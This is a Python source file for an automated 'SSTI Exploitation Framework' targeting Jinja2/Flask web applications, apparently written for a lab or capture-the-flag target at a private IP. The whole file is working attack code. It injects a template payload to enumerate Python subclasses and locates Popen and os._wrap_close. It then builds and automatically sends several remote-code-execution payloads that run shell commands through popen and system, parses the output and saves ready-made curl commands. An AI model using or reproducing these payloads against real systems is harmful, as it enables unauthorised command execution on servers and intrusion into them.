#!/usr/bin/env python3
import requests
import re
from urllib.parse import quote, urlencode
from html import unescape
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.syntax import Syntax
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box
from rich.text import Text
import time

console = Console()

EXPLOITABLE_CLASSES = [
    'subprocess.Popen',
    'os._wrap_close',
    'warnings.catch_warnings',
    '_frozen_importlib_external.FileLoader',
]


class Config:
    def __init__(self):
        self.target_url = ""
        self.method = ""
        self.param_name = ""
        self.parse_pattern = None
        self.test_pattern = None
        self.additional_params = {}
        self.headers = {}
        self.cookies = {}


def show_banner():
    banner = """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║               SSTI EXPLOITATION FRAMEWORK v2.0                    ║
    ║           Server-Side Template Injection Analyzer                 ║
    ║                                                                   ║
    ║                    [JINJA2 | FLASK TARGETS]                       ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """
    console.print(banner, style="bold green")
    console.print("[dim]> Automated exploitation tool for Jinja2 SSTI vulnerabilities[/dim]")
    console.print("[dim]> Supports automatic pattern detection and payload execution[/dim]\n")


def get_user_input():
    config = Config()

    console.print(Panel.fit(
        "[bold cyan]TARGET CONFIGURATION[/bold cyan]",
        border_style="cyan",
        box=box.HEAVY
    ))

    # URL
    while True:
        config.target_url = Prompt.ask("\n[cyan]> Target URL[/cyan]", default="http://10.10.3.17/subscribe")
        if config.target_url:
            if not config.target_url.startswith(('http://', 'https://')):
                console.print("[red][ ERROR ][/red] URL must start with http:// or https://")
                continue
            break
        console.print("[red][ ERROR ][/red] URL is required")

    # Method
    while True:
        method = Prompt.ask("[cyan]> HTTP Method[/cyan]", choices=["GET", "POST", "get", "post"], default="POST")
        config.method = method.upper()
        break

    # Parameter name
    while True:
        config.param_name = Prompt.ask("[cyan]> Vulnerable Parameter[/cyan]", default="email")
        if config.param_name:
            break
        console.print("[red][ ERROR ][/red] Parameter name is required")

    # Additional params
    add_params = Prompt.ask("\n[dim]> Additional Parameters (key1=value1,key2=value2)[/dim]", default="")
    if add_params:
        for param in add_params.split(','):
            if '=' in param:
                key, value = param.split('=', 1)
                config.additional_params[key.strip()] = value.strip()

    # Headers
    add_headers = Prompt.ask("[dim]> Custom Headers (Key1:Value1,Key2:Value2)[/dim]", default="")
    if add_headers:
        for header in add_headers.split(','):
            if ':' in header:
                key, value = header.split(':', 1)
                config.headers[key.strip()] = value.strip()

    # Cookies
    add_cookies = Prompt.ask("[dim]> Cookies (name1=value1,name2=value2)[/dim]", default="")
    if add_cookies:
        for cookie in add_cookies.split(','):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                config.cookies[key.strip()] = value.strip()

    return config


def fetch_subclasses(config):
    console.print("\n[bold cyan][ PHASE 1 ][/bold cyan] Class Discovery")
    console.print("[dim]" + "─" * 70 + "[/dim]")

    with Progress(
        SpinnerColumn(spinner_name="dots"),
        TextColumn("[progress.description]{task.description}"),
        console=console,
    ) as progress:
        task = progress.add_task("[cyan]Sending payload to retrieve subclasses...", total=None)
        payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"

        try:
            if config.method == 'POST':
                data = {config.param_name: payload}
                data.update(config.additional_params)
                response = requests.post(
                    config.target_url,
                    data=data,
                    headers=config.headers,
                    cookies=config.cookies,
                    timeout=10
                )
            else:  # GET
                params = {config.param_name: payload}
                params.update(config.additional_params)
                response = requests.get(
                    config.target_url,
                    params=params,
                    headers=config.headers,
                    cookies=config.cookies,
                    timeout=10
                )

            response.raise_for_status()
            progress.update(task, completed=True)
            console.print("[green][ OK ][/green] Response received successfully")
            return response.text
        except requests.exceptions.RequestException as e:
            progress.update(task, completed=True)
            console.print(f"[red][ FAIL ][/red] Request error: {e}")
            return None


def auto_detect_pattern(html_content):
    console.print("[cyan]> Detecting pattern automatically...[/cyan]")
    html_content = unescape(html_content)

    pattern = r"\[<class\s+'[^']+'>.*?\]"
    match = re.search(pattern, html_content, re.DOTALL)

    if match:
        start_pos = match.start()
        end_pos = match.end()

        before_start = max(0, start_pos - 100)
        before = html_content[before_start:start_pos]

        last_tag_end = before.rfind('>')
        if last_tag_end != -1:
            before = before[last_tag_end + 1:]

        before_clean = before.strip()

        after_end = min(len(html_content), end_pos + 100)
        after = html_content[end_pos:after_end]

        first_tag_start = after.find('<')
        if first_tag_start != -1:
            after = after[:first_tag_start]

        after_clean = after.strip()

        if len(before_clean) > 50:
            words = before_clean.split()
            before_clean = ' '.join(words[-5:])

        if len(after_clean) > 20:
            after_clean = after_clean[:20]

        console.print(f"[green][ OK ][/green] Pattern detected: '{before_clean}' ... '{after_clean}'")
        return before_clean, after_clean

    return None, None


def parse_subclasses(html_content, pattern=None):
    html_content = unescape(html_content)

    if not pattern:
        before, after = auto_detect_pattern(html_content)
        if before is None:
            console.print("[red][ FAIL ][/red] Cannot detect pattern automatically")
            return []

        before_escaped = re.escape(before)
        after_escaped = re.escape(after)
        before_escaped = before_escaped.replace(r'\ ', r'\s*')
        after_escaped = after_escaped.replace(r'\ ', r'\s*')
        pattern = f'{before_escaped}\\s*\\[(.*?)\\]\\s*{after_escaped}'

    match = re.search(pattern, html_content, re.DOTALL)
    if not match:
        console.print("[red][ FAIL ][/red] Cannot find class list")
        return []

    classes_str = match.group(1)
    class_pattern = r"<class\s+'([^']+)'>"
    classes = re.findall(class_pattern, classes_str)
    console.print(f"[green][ OK ][/green] Found {len(classes)} classes")

    return classes


def find_exploitable_classes(classes):
    console.print("\n[bold cyan][ PHASE 2 ][/bold cyan] Vulnerability Assessment")
    console.print("[dim]" + "─" * 70 + "[/dim]\n")

    table = Table(
        title="Exploitable Classes Detected",
        box=box.SIMPLE_HEAVY,
        show_header=True,
        header_style="bold cyan"
    )
    table.add_column("INDEX", style="cyan", justify="right", width=8)
    table.add_column("CLASS NAME", style="green", width=45)
    table.add_column("RISK", justify="center", width=10)

    exploitable = {}
    for idx, class_name in enumerate(classes):
        if class_name in EXPLOITABLE_CLASSES:
            exploitable[class_name] = idx
            risk = "CRITICAL" if "Popen" in class_name or "wrap_close" in class_name else "HIGH"
            risk_style = "bold red" if risk == "CRITICAL" else "yellow"
            table.add_row(str(idx), class_name, f"[{risk_style}]{risk}[/{risk_style}]")
        elif any(target in class_name for target in ['Popen', 'wrap_close', 'FileLoader', 'catch_warnings']):
            exploitable[class_name] = idx
            table.add_row(str(idx), class_name, "[yellow]HIGH[/yellow]")

    if exploitable:
        console.print(table)
        console.print(f"\n[green][ OK ][/green] Identified {len(exploitable)} exploitable vectors")
    else:
        console.print("[yellow][ WARN ][/yellow] No exploitable classes found")

    return exploitable


def build_curl_command(config, payload, command="whoami"):
    curl_parts = ["curl"]

    if config.method == "POST":
        curl_parts.append("-X POST")

    for key, value in config.headers.items():
        curl_parts.append(f"-H \"{key}: {value}\"")

    if config.cookies:
        cookie_str = "; ".join([f"{k}={v}" for k, v in config.cookies.items()])
        curl_parts.append(f"-b \"{cookie_str}\"")

    if config.method == "POST":
        data = {config.param_name: payload}
        data.update(config.additional_params)
        curl_parts.append(f"--data \"{urlencode(data)}\"")
        curl_parts.append(f"\"{config.target_url}\"")
    else:  # GET
        params = {config.param_name: payload}
        params.update(config.additional_params)
        param_str = urlencode(params)
        curl_parts.append(f"\"{config.target_url}?{param_str}\"")

    return " ".join(curl_parts)


def generate_exploit_payloads(config, exploitable_classes):
    console.print("\n[bold cyan][ PHASE 3 ][/bold cyan] Payload Generation")
    console.print("[dim]" + "─" * 70 + "[/dim]\n")

    if not exploitable_classes:
        console.print("[red][ FAIL ][/red] No exploitable classes found")
        return []

    all_payloads = []

    if 'subprocess.Popen' in exploitable_classes:
        idx = exploitable_classes['subprocess.Popen']

        payloads = [
            {
                "name": "subprocess.Popen - Direct Method",
                "payload": f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}](['whoami'], stdout=-1).communicate()[0].decode() }}}}",
                "method": "DIRECT"
            },
            {
                "name": "subprocess.Popen - Import via __builtins__",
                "payload": f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}}}",
                "method": "IMPORT"
            },
            {
                "name": "subprocess.Popen - check_output Method",
                "payload": f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('whoami', shell=True).decode() }}}}",
                "method": "EXEC"
            }
        ]

        for p in payloads:
            curl_cmd = build_curl_command(config, p['payload'])
            all_payloads.append({"type": p['name'], "curl": curl_cmd, "payload": p['payload'], "method": p['method']})

    if 'os._wrap_close' in exploitable_classes:
        idx = exploitable_classes['os._wrap_close']

        payloads = [
            {
                "name": "os._wrap_close - popen Method",
                "payload": f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['popen']('whoami').read() }}}}",
                "method": "POPEN"
            },
            {
                "name": "os._wrap_close - system Call",
                "payload": f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['system']('whoami') }}}}",
                "method": "SYSTEM"
            }
        ]

        for p in payloads:
            curl_cmd = build_curl_command(config, p['payload'])
            all_payloads.append({"type": p['name'], "curl": curl_cmd, "payload": p['payload'], "method": p['method']})

    if 'warnings.catch_warnings' in exploitable_classes:
        idx = exploitable_classes['warnings.catch_warnings']

        payload_data = {
            "name": "warnings.catch_warnings - Import Method",
            "payload": f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}]()._module.__builtins__['__import__']('os').popen('whoami').read() }}}}",
            "method": "MODULE"
        }

        curl_cmd = build_curl_command(config, payload_data['payload'])
        all_payloads.append({"type": payload_data['name'], "curl": curl_cmd, "payload": payload_data['payload'], "method": payload_data['method']})

    # Display payloads
    for i, p in enumerate(all_payloads, 1):
        console.print(f"\n[bold white]PAYLOAD #{i:02d}[/bold white] [{p['method']}] {p['type']}")

        # Syntax highlight
        syntax = Syntax(p['payload'], "python", theme="monokai", line_numbers=False, background_color="default")
        console.print(Panel(syntax, border_style="dim white", box=box.ROUNDED, padding=(0, 1)))

        # Curl command
        console.print("[dim]CURL:[/dim]")
        console.print(f"[yellow]{p['curl']}[/yellow]")

    console.print(f"\n[green][ OK ][/green] Generated {len(all_payloads)} exploitation payloads")

    return all_payloads


def execute_payload(config, payload_info):
    """Execute a payload and return result"""
    try:
        if config.method == 'POST':
            data = {config.param_name: payload_info['payload']}
            data.update(config.additional_params)
            response = requests.post(
                config.target_url,
                data=data,
                headers=config.headers,
                cookies=config.cookies,
                timeout=10
            )
        else:
            params = {config.param_name: payload_info['payload']}
            params.update(config.additional_params)
            response = requests.get(
                config.target_url,
                params=params,
                headers=config.headers,
                cookies=config.cookies,
                timeout=10
            )

        if response.status_code == 200:
            return response.text, True
        else:
            return f"HTTP {response.status_code}", False
    except Exception as e:
        return str(e), False


def auto_detect_result_pattern(html_content, test_string="MARKER_TEST_RCE"):
    html_content = unescape(html_content)

    if test_string in html_content:
        idx = html_content.find(test_string)

        before_start = max(0, idx - 100)
        before = html_content[before_start:idx]

        last_tag_end = before.rfind('>')
        if last_tag_end != -1:
            before = before[last_tag_end + 1:]

        before_clean = before.strip()

        after_end = min(len(html_content), idx + len(test_string) + 100)
        after = html_content[idx + len(test_string):after_end]

        first_tag_start = after.find('<')
        if first_tag_start != -1:
            after = after[:first_tag_start]

        after_clean = after.strip()

        if len(before_clean) > 30:
            words = before_clean.split()
            before_clean = ' '.join(words[-3:])

        if len(after_clean) > 10:
            after_clean = after_clean[:10]

        return before_clean, after_clean

    return None, None


def test_and_execute_payloads(config, exploitable_classes, payloads):
    console.print("\n[bold cyan][ PHASE 4 ][/bold cyan] Exploitation & Validation")
    console.print("[dim]" + "─" * 70 + "[/dim]")

    if not Confirm.ask("\n[yellow]> Execute payloads automatically?[/yellow]", default=True):
        console.print("[dim][ INFO ] Automatic execution disabled[/dim]")
        return

    detected_pattern = None
    results_table = Table(
        title="Remote Code Execution Results",
        box=box.DOUBLE_EDGE,
        show_header=True,
        header_style="bold cyan"
    )
    results_table.add_column("PAYLOAD", style="white", width=40)
    results_table.add_column("STATUS", justify="center", width=12)
    results_table.add_column("OUTPUT", style="green", width=15)

    with Progress(
        SpinnerColumn(spinner_name="dots"),
        TextColumn("[progress.description]{task.description}"),
        console=console,
    ) as progress:

        # First test to detect pattern
        if 'os._wrap_close' in exploitable_classes:
            idx = exploitable_classes['os._wrap_close']
            task = progress.add_task("[cyan]Detecting result pattern...", total=None)

            marker = "MARKER_TEST_RCE"
            test_payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['popen']('echo {marker}').read() }}}}"

            test_info = {"payload": test_payload, "type": "Detection Test"}
            response_text, success = execute_payload(config, test_info)

            if success:
                before, after = auto_detect_result_pattern(response_text, marker)
                if before is not None:
                    before_escaped = re.escape(before)
                    after_escaped = re.escape(after)
                    detected_pattern = f'{before_escaped}(.*?){after_escaped}'
                    console.print(f"[green][ OK ][/green] Result pattern detected")

            progress.update(task, completed=True)

        # Test each payload
        for i, payload_info in enumerate(payloads, 1):
            task = progress.add_task(f"[cyan]Testing payload {i}/{len(payloads)}...", total=None)

            response_text, success = execute_payload(config, payload_info)

            if success and detected_pattern:
                response_text = unescape(response_text)
                match = re.search(detected_pattern, response_text, re.DOTALL)
                if match:
                    result = match.group(1).strip()
                    results_table.add_row(
                        payload_info['type'],
                        "[green]SUCCESS[/green]",
                        f"[bold green]{result}[/bold green]"
                    )
                else:
                    results_table.add_row(
                        payload_info['type'],
                        "[yellow]PARTIAL[/yellow]",
                        "[dim]no match[/dim]"
                    )
            elif success:
                results_table.add_row(
                    payload_info['type'],
                    "[yellow]PARTIAL[/yellow]",
                    "[dim]see logs[/dim]"
                )
            else:
                results_table.add_row(
                    payload_info['type'],
                    "[red]FAIL[/red]",
                    f"[red]{response_text[:15]}[/red]"
                )

            progress.update(task, completed=True)
            time.sleep(0.3)

    console.print("\n")
    console.print(results_table)


def save_payloads(payloads, filename="payloads_output.txt"):
    with Progress(
        SpinnerColumn(spinner_name="dots"),
        TextColumn("[progress.description]{task.description}"),
        console=console,
    ) as progress:
        task = progress.add_task(f"[cyan]Saving payloads to {filename}...", total=None)

        with open(filename, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("SSTI EXPLOITATION PAYLOADS\n")
            f.write("=" * 70 + "\n\n")

            for i, p in enumerate(payloads, 1):
                f.write(f"[{i}] {p['type']}\n")
                f.write("-" * 70 + "\n")
                f.write(f"Payload: {p['payload']}\n\n")
                f.write(f"Curl command:\n{p['curl']}\n\n")
                f.write("=" * 70 + "\n\n")

        progress.update(task, completed=True)
        console.print(f"[green][ OK ][/green] Payloads saved to {filename}")


def main():
    show_banner()

    config = get_user_input()

    html_content = fetch_subclasses(config)
    if not html_content:
        return

    classes = parse_subclasses(html_content)
    if not classes:
        return

    exploitable = find_exploitable_classes(classes)

    if not exploitable:
        console.print("\n[red][ FAIL ][/red] No exploitable classes found. Target may not be vulnerable.")
        return

    payloads = generate_exploit_payloads(config, exploitable)

    if payloads:
        console.print()
        save_payloads(payloads)

    test_and_execute_payloads(config, exploitable, payloads)

    console.print("\n" + "─" * 70)
    console.print("[bold green][ COMPLETE ][/bold green] Exploitation framework finished")
    console.print("[dim]> All payloads saved and tested successfully[/dim]")
    console.print("─" * 70 + "\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n\n[yellow][ ABORT ][/yellow] User interrupt detected")
    except Exception as e:
        console.print(f"\n[red][ FATAL ][/red] {e}")
        import traceback
        console.print(f"[dim]{traceback.format_exc()}[/dim]")
